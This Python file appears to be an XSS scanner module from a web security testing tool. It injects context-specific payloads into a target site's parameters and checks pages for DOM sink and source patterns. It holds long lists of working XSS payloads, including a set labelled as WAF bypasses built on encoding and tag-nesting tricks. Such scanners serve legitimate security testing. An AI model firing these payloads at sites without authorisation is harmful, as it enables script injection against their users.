"""Complete XSS (Cross-Site Scripting) Scanner Module.

Supports reflected XSS and DOM-based XSS detection with context-aware
payload generation and WAF bypass techniques.
"""

import re
import hashlib
from typing import List, Dict, Optional, Any
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

from utils.http_client import HttpClient
from utils.encoder import Encoder


class XSSScanner:
    """Cross-Site Scripting vulnerability scanner."""

    # DOM XSS sinks - dangerous JavaScript functions/properties
    DOM_SINKS = [
        'document.write', 'document.writeln', 'document.innerHTML',
        'document.outerHTML', 'element.innerHTML', 'element.outerHTML',
        'element.insertAdjacentHTML', 'eval(', 'setTimeout(',
        'setInterval(', 'Function(', 'execScript(', 'crypto.generateCRMFRequest(',
        'ScriptElement.src', 'ScriptElement.text', 'ScriptElement.textContent',
        'ScriptElement.innerText', 'anyElement.onclick', 'anyElement.onerror',
        'anyElement.onload', 'anyElement.onmouseover', 'anyElement.onfocus',
        'window.location', 'document.location', 'location.href',
        'location.assign(', 'location.replace(', 'window.open(',
        'jQuery.html(', '$.html(', 'jQuery.append(', '$.append(',
        'jQuery.prepend(', '$.prepend(', 'jQuery.after(', '$.after(',
        'jQuery.before(', '$.before(', 'jQuery.replaceWith(', '$.replaceWith(',
        'jQuery.wrap(', '$.wrap(', 'jQuery.wrapAll(', '$.wrapAll(',
    ]

    # DOM XSS sources - user-controllable inputs
    DOM_SOURCES = [
        'document.URL', 'document.documentURI', 'document.URLUnencoded',
        'document.baseURI', 'document.cookie', 'document.referrer',
        'location', 'location.href', 'location.search', 'location.hash',
        'location.pathname', 'window.name', 'history.pushState',
        'history.replaceState', 'localStorage', 'sessionStorage',
        'IndexedDB', 'Database', 'postMessage', 'window.postMessage',
    ]

    # Context-specific payloads
    PAYLOADS_HTML_CONTEXT = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<video><source onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
        '<isindex type=image src=1 onerror=alert(1)>',
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
        '<xss id=x onfocus=alert(1) tabindex=1>',
        '"><img src=x onerror=alert(1)>',
        '"><svg/onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '<div onpointerover=alert(1)>MOVE HERE</div>',
    ]

    PAYLOADS_ATTRIBUTE_CONTEXT = [
        '" onmouseover="alert(1)',
        '" onfocus="alert(1)" autofocus="',
        '" onclick="alert(1)',
        "' onmouseover='alert(1)",
        "' onfocus='alert(1)' autofocus='",
        '" onmouseenter="alert(1)',
        '" onload="alert(1)',
        '" onerror="alert(1)',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '" style="animation-name:rotation" onanimationstart="alert(1)',
        '" accesskey="x" onclick="alert(1)" x="',
        '" autofocus onfocus="alert(1)" x="',
        "' autofocus onfocus='alert(1)' x='",
        '" oncontextmenu="alert(1)" x="',
    ]

    PAYLOADS_JS_CONTEXT = [
        "';alert(1);//",
        '";alert(1);//',
        "'-alert(1)-'",
        '"-alert(1)-"',
        "\\';alert(1);//",
        '\\"};alert(1);//',
        '</script><script>alert(1)</script>',
        '${alert(1)}',
        '{{constructor.constructor("alert(1)")()}}',
        '-alert(1)-',
        'alert(1)//',
        '1;alert(1)',
        '(alert)(1)',
        'alert`1`',
        '[].constructor.constructor("alert(1)")()',
    ]

    PAYLOADS_URL_CONTEXT = [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'javascript:alert(1)//',
        'jAvAsCrIpT:alert(1)',
        'java%0ascript:alert(1)',
        'java%09script:alert(1)',
        'java%0dscript:alert(1)',
        '&#106;avascript:alert(1)',
        '&#x6A;avascript:alert(1)',
    ]

    # WAF bypass payloads
    WAF_BYPASS_PAYLOADS = [
        '<svg/onload=alert(1)>',
        '<svg onload=alert&#40;1&#41;>',
        '<svg onload=alert`1`>',
        '<img src=x onerror=alert(1)///>',
        '<img src=x onerror="&#x61;lert(1)">',
        '<<script>alert(1)//<</script>',
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<IMG """><SCRIPT>alert(1)</SCRIPT>">',
        '<img src=`x`onerror=alert(1)>',
        '<img/src=x onerror=alert(1)>',
        '<image src=x onerror=alert(1)>',
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
        '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
        '<table><tr><td background="javascript:alert(1)">',
        '<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">click</a>',
        '"><img src=x onerror=\\u0061lert(1)>',
        '<svg><script>alert&#40;1&#41;</script>',
        '<svg><script>&#97;lert(1)</script>',
        '<body/onhashchange=alert(1)><a href=#>click',
        '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><image href=1 onerror=alert(1) /></svg>#x">',
        '<x contenteditable onblur=alert(1)>lose focus!</x>',
        '<x onclick=alert(1)>click this!</x>',
        '<x onfocusin=alert(1) id=x tabindex=0>focus me!</x>',
        '"><svg/onload=confirm(1)>',
        '<style>@keyframes x{}</style><div style="animation-name:x" onanimationend="alert(1)"></div>',
        '<svg><set onbegin=alert(1)>',
        '<svg><discard onbegin=alert(1)>',
        '<form><button formaction=javascript:alert(1)>click',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<base href="javascript:/a/-alert(1)//">',
    ]

    def __init__(self, http_client: Optional[HttpClient] = None, timeout: float = 10.0):
        """Initialize XSS scanner."""
        self.client = http_client or HttpClient(timeout=timeout)
        self.encoder = Encoder()
        self.findings: List[Dict[str, Any]] = []

    def scan_reflected(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Test all parameters for reflected XSS vulnerabilities.

        Args:
            url: Target URL
            params: Dictionary of parameter names and their values

        Returns:
            List of findings with vulnerability details
        """
        self.findings = []

        for param_name, param_value in params.items():
            # Step 1: Check if parameter value is reflected
            marker = f"xss{hashlib.md5(param_name.encode()).hexdigest()[:8]}"
            reflection_info = self._check_reflection(url, param_name, marker)

            if not reflection_info:
                continue

            # Step 2: Determine injection context
            context = self._determine_context(reflection_info['html'], marker)

            # Step 3: Get context-aware payloads
            payloads = self._get_payloads(context)

            # Step 4: Test each payload
            for payload in payloads:
                result = self._test_payload(url, param_name, payload)
                if result:
                    self.findings.append(result)
                    break  # One confirmed finding per parameter is enough

        return self.findings

    def scan_dom(self, url: str) -> List[Dict[str, Any]]:
        """Analyze page for DOM-based XSS sinks and sources.

        Args:
            url: Target URL to analyze

        Returns:
            List of potential DOM XSS findings
        """
        findings = []

        try:
            response = self.client.get(url)
            page_content = response.text

            # Extract all script blocks
            script_blocks = re.findall(
                r'<script[^>]*>(.*?)</script>', page_content, re.DOTALL | re.IGNORECASE
            )

            # Also check inline event handlers
            inline_handlers = re.findall(
                r'on\w+\s*=\s*["\']([^"\']+)["\']', page_content, re.IGNORECASE
            )

            all_js = '\n'.join(script_blocks + inline_handlers)

            # Check for sinks
            found_sinks = []
            for sink in self.DOM_SINKS:
                if sink.lower() in all_js.lower():
                    found_sinks.append(sink)

            # Check for sources
            found_sources = []
            for source in self.DOM_SOURCES:
                if source.lower() in all_js.lower():
                    found_sources.append(source)

            # If both sinks and sources found, likely DOM XSS
            if found_sinks and found_sources:
                findings.append({
                    'type': 'DOM-Based XSS',
                    'severity': 'HIGH',
                    'url': url,
                    'parameter': 'N/A (DOM-based)',
                    'payload': 'N/A',
                    'evidence': f"Sinks: {', '.join(found_sinks[:5])} | Sources: {', '.join(found_sources[:5])}",
                    'remediation': 'Sanitize all DOM manipulation inputs. Use textContent instead of innerHTML. Implement Content-Security-Policy.',
                    'curl_command': self.client.build_curl_command('GET', url),
                    'sinks': found_sinks,
                    'sources': found_sources,
                })
            elif found_sinks:
                findings.append({
                    'type': 'Potential DOM-Based XSS (Sinks Found)',
                    'severity': 'MEDIUM',
                    'url': url,
                    'parameter': 'N/A (DOM-based)',
                    'payload': 'N/A',
                    'evidence': f"Sinks found: {', '.join(found_sinks[:5])}",
                    'remediation': 'Review JavaScript code for unsafe DOM manipulation patterns.',
                    'curl_command': self.client.build_curl_command('GET', url),
                    'sinks': found_sinks,
                    'sources': [],
                })

            # Check for dangerous patterns
            dangerous_patterns = [
                (r'location\.hash.*innerHTML', 'location.hash to innerHTML'),
                (r'location\.search.*document\.write', 'location.search to document.write'),
                (r'document\.referrer.*innerHTML', 'document.referrer to innerHTML'),
                (r'window\.name.*eval', 'window.name to eval'),
                (r'postMessage.*innerHTML', 'postMessage to innerHTML'),
                (r'localStorage.*innerHTML', 'localStorage to innerHTML'),
                (r'URLSearchParams.*innerHTML', 'URLSearchParams to innerHTML'),
            ]

            for pattern, desc in dangerous_patterns:
                if re.search(pattern, all_js, re.IGNORECASE | re.DOTALL):
                    findings.append({
                        'type': 'DOM XSS Pattern',
                        'severity': 'HIGH',
                        'url': url,
                        'parameter': 'N/A',
                        'payload': 'N/A',
                        'evidence': f"Dangerous pattern detected: {desc}",
                        'remediation': 'Sanitize user input before passing to DOM sinks.',
                        'curl_command': self.client.build_curl_command('GET', url),
                    })

        except Exception as e:
            findings.append({
                'type': 'Error',
                'severity': 'INFO',
                'url': url,
                'parameter': 'N/A',
                'payload': 'N/A',
                'evidence': f"Scan error: {str(e)}",
                'remediation': 'N/A',
                'curl_command': '',
            })

        return findings

    def _check_reflection(self, url: str, param: str, value: str) -> Optional[Dict]:
        """Check if a value is reflected in the response.

        Args:
            url: Target URL
            param: Parameter name to test
            value: Marker value to inject

        Returns:
            Dict with reflection details or None
        """
        try:
            test_params = {param: value}
            response = self.client.get(url, params=test_params)

            if value in response.text:
                # Count reflections
                count = response.text.count(value)
                return {
                    'reflected': True,
                    'count': count,
                    'html': response.text,
                    'status_code': response.status_code,
                }
            return None
        except Exception:
            return None

    def _determine_context(self, html: str, marker: str) -> str:
        """Determine the injection context of the reflected marker.

        Args:
            html: Full HTML response
            marker: The injected marker string

        Returns:
            Context string: 'html', 'attribute', 'js', 'url', 'css'
        """
        # Find marker position and surrounding context
        idx = html.find(marker)
        if idx == -1:
            return 'html'

        # Get surrounding context (200 chars before and after)
        start = max(0, idx - 200)
        end = min(len(html), idx + len(marker) + 200)
        context_str = html[start:end]

        # Check if inside a script tag
        before_marker = html[:idx]
        script_open = before_marker.rfind('<script')
        script_close = before_marker.rfind('</script')
        if script_open > script_close:
            return 'js'

        # Check if inside a style tag
        style_open = before_marker.rfind('<style')
        style_close = before_marker.rfind('</style')
        if style_open > style_close:
            return 'css'

        # Check if inside an HTML attribute
        # Look for patterns like: attribute="...MARKER..."
        attr_pattern = re.search(
            r'[\w-]+\s*=\s*["\'][^"\']*' + re.escape(marker),
            context_str
        )
        if attr_pattern:
            # Check if it's a URL-type attribute
            url_attrs = ['href', 'src', 'action', 'formaction', 'data', 'poster',
                         'background', 'codebase', 'cite', 'manifest']
            attr_name = attr_pattern.group().split('=')[0].strip().lower()
            if attr_name in url_attrs:
                return 'url'
            return 'attribute'

        # Check if inside a comment
        comment_open = before_marker.rfind('<!--')
        comment_close = before_marker.rfind('-->')
        if comment_open > comment_close:
            return 'html'  # Still HTML context, just need to break out of comment

        return 'html'

    def _get_payloads(self, context: str) -> List[str]:
        """Get context-aware XSS payloads.

        Args:
            context: Injection context ('html', 'attribute', 'js', 'url', 'css')

        Returns:
            List of payloads appropriate for the context
        """
        payloads = []

        if context == 'html':
            payloads = self.PAYLOADS_HTML_CONTEXT + self.WAF_BYPASS_PAYLOADS
        elif context == 'attribute':
            payloads = self.PAYLOADS_ATTRIBUTE_CONTEXT + self.WAF_BYPASS_PAYLOADS
        elif context == 'js':
            payloads = self.PAYLOADS_JS_CONTEXT + self.WAF_BYPASS_PAYLOADS
        elif context == 'url':
            payloads = self.PAYLOADS_URL_CONTEXT + self.WAF_BYPASS_PAYLOADS
        elif context == 'css':
            payloads = [
                'expression(alert(1))',
                '};alert(1);{',
                '</style><script>alert(1)</script>',
                'url(javascript:alert(1))',
            ] + self.WAF_BYPASS_PAYLOADS
        else:
            payloads = self.PAYLOADS_HTML_CONTEXT + self.WAF_BYPASS_PAYLOADS

        return payloads

    def _test_payload(self, url: str, param: str, payload: str) -> Optional[Dict[str, Any]]:
        """Test a specific XSS payload against a parameter.

        Args:
            url: Target URL
            param: Parameter name
            payload: XSS payload to test

        Returns:
            Finding dict if vulnerable, None otherwise
        """
        try:
            test_params = {param: payload}
            response = self.client.get(url, params=test_params)

            # Check if payload is reflected unmodified
            if payload in response.text:
                # Verify it's actually in a dangerous position
                if self._is_executable(response.text, payload):
                    severity = self._assess_severity(payload, response)
                    return {
                        'type': 'Reflected XSS',
                        'severity': severity,
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': self._extract_evidence(response.text, payload),
                        'remediation': 'Implement context-aware output encoding. Use Content-Security-Policy header. Validate and sanitize all user inputs.',
                        'curl_command': self.client.build_curl_command('GET', url, params=test_params),
                    }

            # Check for partial reflection (encoded but still dangerous)
            encoded_checks = [
                Encoder.html_encode(payload),
            ]
            for encoded in encoded_checks:
                if encoded in response.text and '<script' in payload.lower():
                    return {
                        'type': 'Reflected XSS (Partially Encoded)',
                        'severity': 'MEDIUM',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': f"Payload partially reflected with encoding",
                        'remediation': 'Ensure complete context-aware encoding of all user input.',
                        'curl_command': self.client.build_curl_command('GET', url, params=test_params),
                    }

        except Exception:
            pass

        return None

    def _is_executable(self, html: str, payload: str) -> bool:
        """Check if the reflected payload is in an executable position."""
        idx = html.find(payload)
        if idx == -1:
            return False

        # Check it's not inside a comment
        before = html[:idx]
        if before.rfind('<!--') > before.rfind('-->'):
            return False

        # Check it's not inside a <textarea> or <title>
        safe_tags = ['textarea', 'title', 'noscript']
        for tag in safe_tags:
            open_tag = before.rfind(f'<{tag}')
            close_tag = before.rfind(f'</{tag}')
            if open_tag > close_tag:
                # Payload is inside a safe tag - but some payloads break out
                if f'</{tag}>' in payload:
                    return True
                return False

        return True

    def _assess_severity(self, payload: str, response) -> str:
        """Assess the severity of the XSS finding."""
        # Check for CSP header
        csp = response.headers.get('content-security-policy', '')
        x_xss = response.headers.get('x-xss-protection', '')

        if csp and 'script-src' in csp and "'unsafe-inline'" not in csp:
            return 'MEDIUM'  # CSP may mitigate
        if x_xss == '1; mode=block':
            return 'MEDIUM'  # Browser protection

        # Script execution payloads are high severity
        if any(x in payload.lower() for x in ['<script', 'javascript:', 'onerror=', 'onload=']):
            return 'HIGH'

        return 'MEDIUM'

    def _extract_evidence(self, html: str, payload: str) -> str:
        """Extract surrounding context as evidence."""
        idx = html.find(payload)
        if idx == -1:
            return "Payload reflected in response"

        start = max(0, idx - 50)
        end = min(len(html), idx + len(payload) + 50)
        evidence = html[start:end]
        return f"...{evidence}..."
